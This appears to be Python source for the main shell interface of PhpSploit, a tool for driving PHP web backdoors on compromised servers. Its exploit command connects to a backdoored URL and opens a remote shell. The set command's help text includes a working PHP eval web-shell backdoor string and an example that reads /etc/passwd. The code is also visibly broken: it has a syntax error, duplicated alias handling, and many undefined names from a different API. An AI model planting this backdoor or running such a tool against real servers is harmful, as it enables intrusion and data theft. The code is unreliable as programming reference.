"""PhpSploit framework Main shell interface.
The shell interface unherits from the cmdshell library, and provides
all PhpSploit framework interface base stuff, available on both Main
shell (this one itself) and Remote shell interface (which extends this
one).
"""
import os, difflib

import core, cmdshell, session

from datatypes import Path, PhpCode
from ui.color import colorize, decolorize

class Cmd(cmdshell.Cmd):

    prompt = colorize('%Lined', 'phpsploit', '%Reset', ' > ')

    nocmd  = "[!] Unknown Command: %s"
    nohelp = "[!] No help for: %s"
    error  = "[!] %s"

    def __init__(self):
        # explicitly run parent's __init__()
        super(Cmd, self).__init__(self)


    def precmd(self, argv):
        """Handle session aliases"""

        # if first arg is not an alias, return normal argv
        try: alias = getattr(session.Alias, argv[0]):
        except AttributeError: return argv

        # parse alias value, and add result to cmdqueue
        cmds = self.parseline(alias)
        if not cmds: return []
        cmds[-1] += argv
        self.cmdqueue = cmds + self.cmdqueue

        aliasArgs = self.parseline(alias)
        aliasArgs[-1] += argv
        self.cmdqueue = aliasArgs + self.cmdqueue
        return []


    #####################
    ### COMMAND: exit ###
    def do_exit(self, argv):
        """Leave the current shell interface

        SYNOPSIS:
            exit

        DESCRIPTION:
            - Executed from the main shell interface, this command
            leaves the PhpSploit framework.
            - Calling it from a remote shell session simply leaves it,
            backing to the main shell interface
        """
        raise EOFError


    ########################
    ### COMMAND: exploit ###
    def do_exploit(self, argv):
        """Drop a shell from target server

        SYNOPSIS:
            exploit

        DESCRIPTION:
            Send an HTTP request to the remote server's url, defined
            by the TARGET setting. This first request will try to
            execute the phpsploit's base payload, which retrieves some
            fundamental informations concerning the remote server, such
            as the server signature, and php environment. Il also
            uses the caught informations to determine some environment
            variables, such as CWD or WEB_ROOT.

            NOTE: The TARGET setting must be a remote http(s) url which
            has been infected by the phpsploit backdoor payload.
            Take a look at the documentation (rtfm command), and also
            the "infect" command.
        """
        print("[*] Current backdoor is:")
        print( PhpCode(session.Conf.BACKDOOR) + "\n" )

        if self.__class__.__name__ == "RemoteShell":
            m = ("[*] Use `set TARGET <VALUE>` to use another url as target."
                 "\n[*] To exploit a new server, disconnect from «%s» first.")
            return print( m.format(session.Env.HOST) )

        if session.Conf.TARGET is None:
            m = ("To run a remote tunnel, the backdoor shown above must be\n"
                 "manually injected in a remote server executable web page.\n"
                 "Then, use `set TARGET <BACKDOORED_URL>` and run `exploit`.")
            return print( colorize("%BoldCyan", m) )

        print( "[*] Sending payload to «{}» ...".format(session.Conf.TARGET) )
        socket = tunnel.Init() # it raises exception if fails
        remoteShell = ui.shell.Remote()      # start remote shell instance
        remoteShell.cmdqueue = self.cmdqueue # send current command queue
        remoteShell.cmdloop()                # start remote shell interface
        self.cmdqueue = remoteShell.cmdqueue # get back command queue


    ######################
    ### COMMAND: clear ###
    def do_clear(self, argv):
        """Clear the terminal screen

        SYNOPSIS:
            clear

        DESCRIPTION:
            Clear the current visible terminal data, leaving blank the
            screen. Used for visibility purposes.
        """
        return os.system('cls' if os.name=='nt' else 'clear')


    #####################
    ### COMMAND: rtfm ###
    def do_rtfm(self, argv):
        """Read the fine manual

        SYNOPSIS:
            rtfm

        DESCRIPTION:
            Display the PhpSploit's user manual using the "man" command,
            or simply write to standard output it's ascii version on
            OSes which do not provide manpage system.
        """
        txtMan = lambda: print(Path(core.basedir, 'man/phpsploit.txt').read())
        if os.name == 'nt':
            txtMan()
        else:
            cmd = 'man ' + Path(core.basedir, 'man/phpsploit.1')
            return_value = os.system(cmd)
            if return_value is not 0:
                txtMan()


    ########################
    ### COMMAND: session ###
    def complete_session(self, text, *ignored):
        keys = ['save', 'diff']
        # load argument is not available from remote shell:
        if self.__class__.__name__ == "MainShell":
            keys.append('load')
        return [x+' ' for x in keys if x.startswith(text)]

    def do_session(self, argv):
        """PhpSploit session handler

        SYNOPSIS:
            session [load|save|diff] [<FILE>]

        DESCRIPTION:
            The `session` core command handles session instances.
            Sessions can be considered as PhpSploit instances. They
            handle current configuration settings, environment vars,
            command aliases, and remote tunnel attributes (if any).

        USAGE:
            * session [<FILE>]
                Show a nice colored representation of FILE session
                content. If unset, FILE is implicly set to current
                instance's session.
            * session diff [<FILE>]
                Shows a textual representation of the differences
                between FILE and current session state. If FILE is
                not set, $SAVEFILE setting is used. If $SAVEFILE is
                not set, the session's state when framework started
                is used as comparator.
            * session save [<FILE>]
                Dumps the current session instance into the given file.
                If FILE is unset, then the session is saved to $SAVEFILE
                setting, if $SAVEFILE does not exist, then the file path
                "$SAVEPATH/phpsploit.session" is implicitly used.
            * session load [<FILE>]
                Try to load <FILE> as the current session. If unset,
                FILE is implicitly set to "./phpsploit.session".

        EXAMPLES:
            > session load /tmp/phpsploit.session
              - Load /tmp/phpsploit.session.
            > session save
              - Save current state to session's source file (SAVEFILE).

        WARNING:
            The command's `load` argument cannot be used from a remote
            shell interface. It means that a remote shell must be left
            first, in order to load a file stored session file.

        """
        argv += [None, None] # prevent argv IndexErrors

        try:
            # session save
            if argv[1] == 'save':
                return session.dump(argv[2])
            # session load
            if argv[1] == 'load':
                return session.load(argv[2])
            # session diff
            if argv[1] == 'diff':
                new = decolorize(session.dump()).splitlines()
                if argv[2] is None:
                    old = session.Backup().dump()
                else:
                    old = session.New(argv[2])
                old = decolorize(old).splitlines()

                color = {' ':'%Reset', '+':'%Red', '-':'%Green', '?':'%Pink'}
                for line in difflib.Differ().compare(old, new):
                    print( colorize(color[line[0]], line) )
                return
            # session <FILE>
            if argv[1] is not None:
                return print( session.load(argv[1]).dump() )
            # session
            return print( session.dump() )

        # run command help on any error
        except:
            return self.addcmd("help session")


    #####################
    ### COMMAND: lpwd ###
    def do_lpwd(self, argv):
        """Print local working directory

        SYNOPSIS:
            lpwd

        DESCRIPTION:
            This command print the local working directory from your own
            local system, exactly like does the "pwd" shell command on
            unix systems.
        """
        print( os.getcwd() )


    ####################
    ### COMMAND: lcd ###
    def do_lcd(self, argv):
        """Change local working directory

        SYNOPSIS:
            lcd <LOCAL DIRECTORY>

        DESCRIPTION:
            The "lcd" command is an equivalent of the "cd" unix
            command. It must be used to change the current working
            directory of your local system.

            NOTE: This command should not be confused with the
            PhpSploit's "cd" command, which is a plugins doing the same
            on the remotely exploited system.

        EXAMPLES:
            > lcd ~
            > lcd /tmp
        """
        # only one argument must be supplied
        if len(argv) != 2:
            return self.addcmd('help lcd')

        # expand user special path notation "~"
        newDir = os.path.expanduser( argv[1] )
        try:
            os.chdir(newDir)
        except OSError as e:
            return "«{}»".format(e.filename), e.strerror


    ####################
    ### COMMAND: source ##
    def do_source(self, argv):
        """Execute a PhpSploit script file

        SYNOPSIS:
            source <LOCAL FILE>

        DESCRIPTION:
            This command takes a file name as argument, and executes
            its content lines as a list of PhpSploit commands.

        EXAMPLES:
            > source /tmp/spl01t-script.phpsploit
              - Run the given script file's content, line by line
        """
        if len(argv) != 2:
            return self.addcmd("help source")

        try:
            self.addcmd( open(argv[1], 'r').read() )
        except OSError as e:
            return "«{}»".format(e.filename), e.strerror


    ####################
    ### COMMAND: set ###
    def complete_set(self, text, *ignored):
        """use the settings list as "set" argument completion array"""
        text = text.upper()
        completions = list()
        for key in self.CNF['SET'].keys():
            if key.startswith(text):
                completions.append(key+' ')
        return(completions)

    def do_set(self, argv):
        """View and edit settings

        SYNOPSIS:
            set [<NAME> ["<VALUE>"]]

        DESCRIPTION:
            The PhpSploit settings are declared at start by their
            default values. The user configuration overwrite them for
            customisation purposes.
            The 'set' command handles settings from the framework
            interface.
            - Called with no argument, the whole settings list will be
              displayed.
            - A single argument displays the list of settings whose
              name start with it.
            - Two arguments are used to change the value of a setting,
              considering the first one as the setting to be changed;
              and the second as the new setting value.

            NOTE: The 'set' operating scope is limited to the current
            PhpSploit session. It means that persistant settings value
            changes must be defined by the hand in the user
            configuration file.


        WARNING:
            Considering the PhpSploit's input parser, commands which
            contain quotes, semicolons, and other chars that could be
            interpreted by the framework MUST be enquoted to be
            interpreted as a single argument. For example:
              > run echo 'foo bar' > /tmp/foobar; cat /etc/passwd
            In this case, quotes and semicolons will be interpreted by
            the framwework, so the correct syntax is:
              > run "echo 'foo bar' > /tmp/foobar; cat /etc/passwd"

        EXAMPLES:
            > set REQ_
              - Display all settings whose name begins with "REQ_"
            > set TEXTEDITOR
              - Show the current value of the TEXTEDITOR setting
            > set TEXTEDITOR /usr/bin/vim
              - Set "/usr/bin/vim" as TEXTEDITOR value (<3 vim)
            > set BACKDOOR "<?php @eval($_SERVER['HTTP_%%PASSKEY%%']);?>"
              - Set BACKDOOR's new value, in this case, the string
                to use as value contained quotes and semicolons,
                which are interpreted by the interface, like in bash.
                For that reason the value MUST BE correctly enquoted.
        """
        def set_var(var, val):
            """(try to) change the value to "val" of the "var" setting"""
            # use backup and set new value
            backup = self.CNF['SET'][var]
            self.CNF['SET'][var] = val
            from usr.settings import comply

            # if the new value is syntaxically accepted by settings lib:
            if comply(self.CNF['SET']):

                # the LNK object must be backed up and updated before
                # possible on the fly TARGET url modification.
                lnk_backup = self.CNF['LNK']
                self.CNF['LNK'] = update_opener(self.CNF)

                # Changing TARGET on the fly, during a remote shell session
                # implies that a payload link must be estabilished with the
                # new value, and the new TARGET signature compared to the old.
                if var == 'TARGET' and self.shell_name == 'remote':
                    import network.server
                    if network.server.Link(self.CNF).check():
                        self.CNF['LNK_HASH'] = self.CNF['LNK']['HASH']
                        self.set_prompt()
                    else:
                        self.CNF['LNK'] = lnk_backup
                        self.CNF['SET'][var] = backup

                # on normal scenarios, just display the new value,
                # which indicates a successfull operation.
                else:
                    showVal = color(1) + self.CNF['SET'][var] + color(0)
                    print( var + " ==> " + showVal )

            # incorrect syntax juste resets the value to backup
            else:
                self.CNF['SET'][var] = backup

        # Display settings list
        if len(argv) <= 2:
            # list settings matching argv[1]
            patern = argv[1].upper() if len(argv) > 1 else ''
            title = "Session settings"
            items = self.CNF['SET'].items()
            elems = [(x.upper(),y) for x,y in items if x.startswith(patern)]
            # an empty array implies that the given argument was
            # wrong, then display the help message instead
            if elems:
                columnize_vars(title, dict(elems)).write()
            else:
                self.run('help set')

        # Change the specified setting
        else:
            setting = argv[1].upper()
            if setting in self.CNF['SET']:
                if setting in self.locked_settings:
                    print( P_err+'Locked session setting: '+setting )
                else:
                    value = ' '.join( argv[2:] ).strip()
                    set_var(setting, value)
            else:
                self.run('help set')



    #####################
    ### COMMAND: help ###
    def do_help(self, argv):
        """Show commands help

        SYNOPSIS:
            help [<COMMAND>]

        DESCRIPTION:
            It displays help message for any command, including
            plugins.
            - Without arguments, the whole available commands, sorted
              by category, are displayed including a summary line for
              each one.
            - To display the full help message of a specific command,
              it must be given as argument.

            NOTE: A plugin command may also be called with "--help"
            a argument, resulting to the same as "help <plugin>".

        EXAMPLES:
            > help
              - Displpay the full help, sorted by category
            > help clear
              - Display the help for the "clear" command
        """
        # If more than 1 argument, help to help !
        if len(argv) > 2:
            return( self.run('help help') )

        # collect the command list from current shell
        sys_commands = self.get_commands(self)

        def get_doc(cmdName):
            """return the docstring lines list of specific command"""
            # try to get the doc from the plugin method
            try:
                docString = self.plugins.get(cmdName, 'help')
            except:
                docString = None
            # or try to get it from the shell commands
            if cmdName in sys_commands:
                docString = getattr(self, 'do_'+cmdName).__doc__
            # else try to get it from the core commands
            if docString is None:
                try:
                    docString = getattr(CoreShell, 'do_'+cmdName).__doc__
                except:
                    docString = None
            # a list, even empty must be returned in any case
            if docString is None:
                return( list() )
            return( docString.strip().splitlines() )

        def get_description(docLines):
            """return the command description (1st docstring line)"""
            try:
                return( docLines[0].strip() )
            except:
                return( color(33) + 'No description' + color(0) )

        def doc_help(docLines):
            """print the formated command's docstring"""
            # reject empty docstrings (description + empty line)
            if len(docLines) < 2:
                return(None)
            docLines.pop(0) # remove the description line
            while not docLines[0].strip():
                docLines.pop(0) # remove heading empty lines

            # remove junk leading spaces (due to python indentation)
            trash = len( docLines[0] ) - len( docLines[0].lstrip() )
            docLines = [ line[trash:].rstrip() for line in docLines ]

            # hilight lines with no leading spaces (man style)
            result = str()
            for line in docLines:
                if line == line.lstrip():
                    line = color(1) + line + color(0)
                result += line + P_NL

            print(result)

        # get full help on a single command
        if len(argv) == 2:
            doc = get_doc(argv[1])
            # if the given argument if not a command, return nohelp err
            if not doc:
                print( self.nohelp %raw_repr(argv[1]) )
                return(None)

            # print the heading help line, which contain description
            print( P_NL + P_inf + argv[1] + ": " +
                   get_description(doc) + P_NL )

            # call the help_<command> method, otherwise, print it's docstring
            try:
                getattr( self, 'help_'+argv[1] )()
            except:
                doc_help(doc)
            return(None)

        # display the whole list of commands, with their description line

        # set maxLength to the longest command name, and at least 13
        maxLength = max( 13, len(max(sys_commands, key=len)) )

        # split sys_commands into shell and core command categories
        core_commands  = self.get_commands(CoreShell)
        shell_commands = [x for x in sys_commands if x not in core_commands]
        help = [('Core Commands', core_commands),
                ('Shell Commands', shell_commands)]

        # adds plugin category if we are in the remote shell
        if self.shell_name == 'remote':
            for category in self.plugins.categories():
                name = category.replace('_', ' ').capitalize()
                items = self.plugins.list_category(category)

                # rescale maxLength in case of longer plugin names
                maxLength = max( maxLength, len(max(items, key=len)) )
                help += [ (name+' Plugins', items) ]

        # print commands help, sorted by groups
        cmdColumn = ' ' * (maxLength-5)
        for groupName, groupCommands in help:

            # display group (category) header block
            underLine = '=' * len(groupName)
            print( P_NL + groupName +  P_NL + underLine      + P_NL +
                   '    Command' + cmdColumn + 'Description' + P_NL +
                   '    -------' + cmdColumn + '-----------' + P_NL )

            # display formated command/description pairs
            groupCommands.sort()
            for cmdName in groupCommands:
                spaceFill = ' ' * ( maxLength - len(cmdName) +2 )
                description = get_description( get_doc(cmdName) )
                print( '    ' + cmdName + spaceFill + description )
            print('')
